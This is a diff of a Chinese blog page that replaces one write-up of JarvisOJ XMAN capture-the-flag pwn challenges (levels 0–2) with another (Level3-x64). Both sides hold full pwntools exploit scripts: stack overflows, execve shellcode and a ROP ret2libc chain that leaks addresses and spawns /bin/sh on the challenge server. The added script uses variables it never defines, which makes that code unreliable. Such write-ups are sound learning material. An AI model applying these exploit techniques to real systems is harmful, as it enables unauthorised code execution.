@@ -3,18 +3,18 @@
 <head>
   <meta charset="utf-8">
   
-  <title>X-MAN(level0~level2) | YungGong</title>
+  <title>XMAN-Level3-x64 | YungGong</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="X-MAN(level0~level2)">
+  <meta name="description" content="XMAN-Level3-x64">
 <meta property="og:type" content="article">
-<meta property="og:title" content="X-MAN(level0~level2)">
-<meta property="og:url" content="http://yunnigu.dropsec.xyz/2017/02/24/X-MAN-level0-level2/index.html">
+<meta property="og:title" content="XMAN-Level3-x64">
+<meta property="og:url" content="http://yunnigu.dropsec.xyz/2017/02/27/XMAN-Level3-x64/index.html">
 <meta property="og:site_name" content="YungGong">
-<meta property="og:description" content="X-MAN(level0~level2)">
-<meta property="og:updated_time" content="2017-02-24T08:14:33.689Z">
+<meta property="og:description" content="XMAN-Level3-x64">
+<meta property="og:updated_time" content="2017-02-27T10:16:57.385Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="X-MAN(level0~level2)">
-<meta name="twitter:description" content="X-MAN(level0~level2)">
+<meta name="twitter:title" content="XMAN-Level3-x64">
+<meta name="twitter:description" content="XMAN-Level3-x64">
   
     <link rel="alternative" href="/atom.xml" title="YungGong" type="application/atom+xml">
   
@@ -225,11 +225,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-X-MAN-level0-level2" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="w-XMAN-Level3-x64" class="article article-type-w" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/02/24/X-MAN-level0-level2/" class="article-date">
-      <time datetime="2017-02-24T06:01:35.000Z" itemprop="datePublished">2017-02-24</time>
+      <a href="/2017/02/27/XMAN-Level3-x64/" class="article-date">
+      <time datetime="2017-02-27T09:03:40.000Z" itemprop="datePublished">2017-02-27</time>
 </a>
     </div>
   
@@ -242,7 +242,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      X-MAN(level0~level2)
+      XMAN-Level3-x64
     </h1>
   
 
@@ -263,65 +263,51 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="X-MAN-level0-level2"><a href="#X-MAN-level0-level2" class="headerlink" title="X-MAN(level0~level2)"></a>X-MAN(level0~level2)</h1><a id="more"></a>
-<p>题目资源在<a href="https://www.jarvisoj.com" target="_blank" rel="external">这里</a></p>
-<p>这几个题目比较简单，就不一一详细描述了，exp如下：</p>
-<h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><p>栈溢出十分明显，程序里自带callsystem的函数，看了一下，就是调用/bin/sh，直接跳转过去就好</p>
+        <h1 id="XMAN-Level3-x64"><a href="#XMAN-Level3-x64" class="headerlink" title="XMAN-Level3-x64"></a>XMAN-Level3-x64</h1><a id="more"></a>
+<p>这个题目和XMAN-Level2-x64考察目的是一样的，都是考察在x64中传参数的问题，这个题目是如何考察在x64中传多个参数。</p>
+<p>由于本题目需要通过write泄漏实际地址，因此需要传递多个参数，rdx这个寄存器在程序中没有找到合适的gadget，但是通过调试会发现rdx这个值比较大，我们需要传入的也是一个较大的值便于进行write和read，这样就可以不用设置这样一个rdx的值。</p>
+<p>还有个问题是在运行脚本的时候发现，目标机上程序调用的并不是给的那个库，而是libc.so.6。脚本如下：</p>
 <pre><code>from pwn import *
-#p=process(&apos;./level0&apos;)
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-
-call_system=0x0000000000400596
-payload=&apos;a&apos;*136+p64(call_system)
+# p = process(&apos;./level3_x64&apos;)  # local
+libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
+# context.log_level = &apos;debug&apos;
+p = remote(&apos;pwn2.jarvisoj.com&apos;, 9883)  # remote
+# libc = ELF(&apos;libc-2.19.so&apos;)  # remote
+elf = ELF(&apos;./level3_x64&apos;)
+# offest
+readoffest = libc.symbols[&apos;read&apos;]
+systemoffest = libc.symbols[&apos;system&apos;]
+# plt
+readplt = elf.plt[&apos;read&apos;]
+writeplt = elf.plt[&apos;write&apos;]
+# got
+readgot = elf.got[&apos;read&apos;]
+# addr
+basebss = elf.bss()
+rdiret = 0x00000000004006b3
+rsiret = 0x00000000004006b1
+vuladdr = 0x00000000004005E6
+payload = &quot;A&quot;*136 
+payload+= p64(rdiret) + p64(1) #write函数的第一个参数 
+payload+= p64(rsiret) + p64(readgot) #write函数的第二个参数，待显示字符串的首地址
+payload+= p64(8) #write函数的第三个参数，待显示字符串的字节数
+payload+= p64(writeplt) + p64(vuladdr)
+p.recvuntil(&apos;Input:\n&apos;)
+# gdb.attach(p)
 p.send(payload)
-p.interactive()
-</code></pre><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>同样是很简单的栈溢出，弄清楚shellcode的存放地址</p>
-<pre><code>from pwn import *
-# p = process(&apos;./level1&apos;)  # local
-p = remote(&apos;pwn2.jarvisoj.com&apos;, 9877)  # remote
-p.recvuntil(&apos;:&apos;)
-address = p.recvuntil(&apos;?&apos;, drop=True)
-address = int(address, 16)
-print address
-junk = &apos;a&apos; * 0x88
-ebp = &apos;aaaa&apos;
-retaddr = address + 0x88 + 4 + 4
-shellcode = &quot;\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f&quot; \
-    &quot;\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0&quot; \
-    &quot;\x0b\xcd\x80\n&quot;
-payload = junk + ebp + p32(retaddr) + shellcode
-p.send(payload)
-p.interactive()
-</code></pre><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>还是栈溢出，搜索字符串发现bss段里有“/bin/sh”,可以直接调用。注意p32(4)是虚构的返回地址，随便是申都可以。</p>
-<pre><code>from pwn import *
-
-#p=process(&apos;./level2&apos;)
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9878)
-
-systemadd=0x08048320
-shelladd=0x0804A024
-
-payload=&apos;a&apos;*140+p32(systemadd)+p32(4)+p32(shelladd)
-
-p.send(payload)
-p.interactive()
-</code></pre><h3 id="level2-x86"><a href="#level2-x86" class="headerlink" title="level2_x86"></a>level2_x86</h3><p>本题主要考察的是64位下参数的传递顺序，从第一个到第六个依次保存在rdi，rsi，rdx，rcx，r8，r9，之后所有的参数通过栈来传递。本题的关键在于将/bin/sh放在RDI寄存器中。</p>
-<pre><code>from pwn import *
-
-#p=process(&apos;./level2_x64&apos;)
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9882)
-
-level2=ELF(&apos;./level2_x64&apos;)
-systemadd=level2.plt[&apos;system&apos;]
-print hex(systemadd)
-
-shelladd=0x00600a90
-rdiret=0x00000000004006b3
-
-payload=&apos;a&apos;*128+&quot;b&quot;*8+p64(rdiret)+p64(shelladd)+p64(systemadd)
-
-p.send(payload)
-p.interactive()
+readaddr = u64(p.recv(8))
+systemaddr = readaddr - readoffest + systemoffest
+payload  = &quot;A&quot;*136 
+payload += p64(rdiret) + p64(0) #read函数的第一个参数，stdin
+payload += p64(rsi2ret) + p64(basebss)#read函数的第二个参数，待写入地址空间的首地址
+payload += p64(888)  #read函数的第三个参数，待写入字符串的长度
+payload += p64(readaddr)
+payload += p64(rdiret) #read函数的第一个参数
+payload += p64(basebss) #read函数的第二个参数，待写入地址空间的首地址 
+payload += p64(systemaddr) 
+sh.send(payload)
+sh.send(&apos;/bin/sh\x00&apos;)
+sh.interactive()
 </code></pre>
       
     </div>
@@ -330,13 +316,13 @@ p.interactive()
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/02/24/X-MAN-level0-level2/">X-MAN(level0~level2)</a></p>
+        <p><span>本文标题:</span><a href="/2017/02/27/XMAN-Level3-x64/">XMAN-Level3-x64</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Yun 的个人博客">Yun</a></p>
-        <p><span>发布时间:</span>2017年02月24日 - 14时01分</p>
-        <p><span>最后更新:</span>2017年02月24日 - 16时14分</p>
+        <p><span>发布时间:</span>2017年02月27日 - 17时03分</p>
+        <p><span>最后更新:</span>2017年02月27日 - 18时16分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/02/24/X-MAN-level0-level2/" title="X-MAN(level0~level2)">http://yunnigu.dropsec.xyz/2017/02/24/X-MAN-level0-level2/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yunnigu.dropsec.xyz/2017/02/24/X-MAN-level0-level2/　　作者: Yun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/02/27/XMAN-Level3-x64/" title="XMAN-Level3-x64">http://yunnigu.dropsec.xyz/2017/02/27/XMAN-Level3-x64/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yunnigu.dropsec.xyz/2017/02/27/XMAN-Level3-x64/　　作者: Yun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -349,18 +335,9 @@ p.interactive()
 
 <nav id="article-nav">
   
-    <a href="/2017/02/24/X-MAN-level3/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          X-MAN-level3
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/02/24/延迟绑定技术原理/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">延迟绑定技术原理</div>
+    <a href="/2017/02/24/X-MAN-level3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">X-MAN-level3</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -371,7 +348,7 @@ p.interactive()
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#X-MAN-level0-level2"><span class="toc-number">1.</span> <span class="toc-text">X-MAN(level0~level2)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level0"><span class="toc-number">1.0.1.</span> <span class="toc-text">level0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level1"><span class="toc-number">1.0.2.</span> <span class="toc-text">level1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-number">1.0.3.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2-x86"><span class="toc-number">1.0.4.</span> <span class="toc-text">level2_x86</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XMAN-Level3-x64"><span class="toc-number">1.</span> <span class="toc-text">XMAN-Level3-x64</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -419,7 +396,7 @@ p.interactive()
     
       <div class="duoshuo" id="comments">
     <!-- 多说评论框 start -->
-    <div class="ds-thread" data-thread-key="2017/02/24/X-MAN-level0-level2/" data-title="X-MAN(level0~level2)" data-url="http://yunnigu.dropsec.xyz/2017/02/24/X-MAN-level0-level2/"></div>
+    <div class="ds-thread" data-thread-key="2017/02/27/XMAN-Level3-x64/" data-title="XMAN-Level3-x64" data-url="http://yunnigu.dropsec.xyz/2017/02/27/XMAN-Level3-x64/"></div>
     <!-- 多说评论框 end -->
     <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
     <script type="text/javascript">
@@ -442,13 +419,11 @@ p.interactive()
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/02/24/X-MAN-level3/" title="上一篇: X-MAN-level3">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2017/02/24/延迟绑定技术原理/" title="下一篇: 延迟绑定技术原理">
+            <a href="/2017/02/24/X-MAN-level3/" title="下一篇: X-MAN-level3">
                 <i class="fa fa-angle-right"></i>
             </a>
         
